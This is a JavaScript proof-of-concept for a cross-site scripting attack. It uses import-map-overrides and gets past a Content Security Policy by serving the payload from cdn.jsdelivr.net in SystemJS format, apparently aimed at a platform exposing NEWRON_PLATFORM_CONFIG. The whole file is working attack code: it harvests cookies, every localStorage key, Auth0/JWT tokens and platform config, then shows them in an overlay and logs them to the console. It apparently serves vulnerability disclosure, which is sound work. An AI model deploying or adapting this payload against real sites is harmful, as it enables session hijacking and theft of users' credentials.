// PoC - XSS via import-map-overrides (jsdelivr version)
// Hosted on GitHub -> served via cdn.jsdelivr.net (allowed by CSP)
// SystemJS register format

System.register([], function(exports) {
    return {
        execute: function() {
            pocExecute();
        }
    };
});

// Top-level fallback
pocExecute();

function pocExecute() {
    if (window.__XSS_POC_EXECUTED) return;
    window.__XSS_POC_EXECUTED = true;

    // Recopilar info
    var stolen = {
        url: window.location.href,
        origin: window.location.origin,
        domain: document.domain,
        cookies: document.cookie,
        localStorage_keys: [],
        tokens: []
    };

    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        var value = localStorage.getItem(key);
        stolen.localStorage_keys.push(key);
        if (key.indexOf('auth0') !== -1 || key.indexOf('token') !== -1 || key.indexOf('@@') !== -1) {
            stolen.tokens.push({ key: key, value: value });
        }
    }

    if (window.NEWRON_PLATFORM_CONFIG) {
        stolen.platformConfig = window.NEWRON_PLATFORM_CONFIG;
    }

    // Overlay visual
    function showOverlay() {
        var overlay = document.createElement('div');
        overlay.id = 'xss-poc-overlay';
        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;color:#0f0;font-family:monospace;padding:40px;overflow:auto;font-size:13px;';

        var h = '';
        h += '<div style="max-width:900px;margin:0 auto;">';
        h += '<h1 style="color:#f00;font-size:28px;margin:0;">&#9888; XSS CONFIRMED &#9888;</h1>';
        h += '<h2 style="color:#ff0;margin:5px 0;">import-map-overrides + CSP bypass via cdn.jsdelivr.net</h2>';
        h += '<hr style="border-color:#333">';

        h += '<h3 style="color:#0ff;">Execution context:</h3>';
        h += '<pre style="color:#0f0;">' + esc(window.location.origin) + '</pre>';

        h += '<h3 style="color:#0ff;">document.domain:</h3>';
        h += '<pre style="color:#0f0;">' + esc(document.domain) + '</pre>';

        h += '<h3 style="color:#0ff;">Cookies:</h3>';
        h += '<pre>' + (document.cookie || '(HttpOnly or none)') + '</pre>';

        h += '<h3 style="color:#0ff;">Auth0 tokens in localStorage:</h3>';
        if (stolen.tokens.length > 0) {
            stolen.tokens.forEach(function(t) {
                h += '<pre style="color:#0f0;word-break:break-all;background:#111;padding:8px;border-left:3px solid #f00;">';
                h += '<b style="color:#ff0;">' + esc(t.key) + '</b>\n';
                h += esc(t.value.substring(0, 500));
                if (t.value.length > 500) h += '\n... (' + t.value.length + ' chars total)';
                h += '</pre>';
            });
        } else {
            h += '<pre style="color:#f80;">(user not authenticated - no tokens found)</pre>';
            h += '<pre style="color:#888;">If an authenticated user opens this URL, their tokens would appear here.</pre>';
        }

        h += '<h3 style="color:#0ff;">All localStorage keys (' + localStorage.length + '):</h3>';
        h += '<pre style="max-height:150px;overflow:auto;background:#111;padding:8px;">';
        for (var j = 0; j < localStorage.length; j++) {
            h += esc(localStorage.key(j)) + '\n';
        }
        h += '</pre>';

        if (stolen.platformConfig) {
            h += '<h3 style="color:#0ff;">window.NEWRON_PLATFORM_CONFIG:</h3>';
            h += '<pre style="background:#111;padding:8px;">' + esc(JSON.stringify(stolen.platformConfig, null, 2)) + '</pre>';
        }

        h += '<hr style="border-color:#333">';
        h += '<h3 style="color:#f00;">Impact:</h3>';
        h += '<ul style="color:#ff0;line-height:1.8;">';
        h += '<li>Arbitrary JavaScript execution on ' + esc(window.location.origin) + '</li>';
        h += '<li>Full access to localStorage (Auth0/JWT tokens)</li>';
        h += '<li>Access to cookies (non-HttpOnly)</li>';
        h += '<li>Full DOM access</li>';
        h += '<li>Can make API calls as the victim user via fetch()</li>';
        h += '</ul>';

        h += '<h3 style="color:#0ff;">Attack vector:</h3>';
        h += '<pre style="color:#ff0;word-break:break-all;background:#111;padding:8px;">' + esc(window.location.href) + '</pre>';

        h += '<p style="color:#888;margin-top:20px;">Click anywhere to close this overlay.</p>';
        h += '</div>';

        overlay.innerHTML = h;
        overlay.onclick = function() { overlay.remove(); };
        document.body.appendChild(overlay);
    }

    function esc(str) {
        if (!str) return '';
        return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    if (document.body) {
        showOverlay();
    } else {
        document.addEventListener('DOMContentLoaded', showOverlay);
    }

    console.log('[XSS PoC] Executed on:', window.location.origin);
    console.log('[XSS PoC] Stolen data:', JSON.stringify(stolen, null, 2));
}
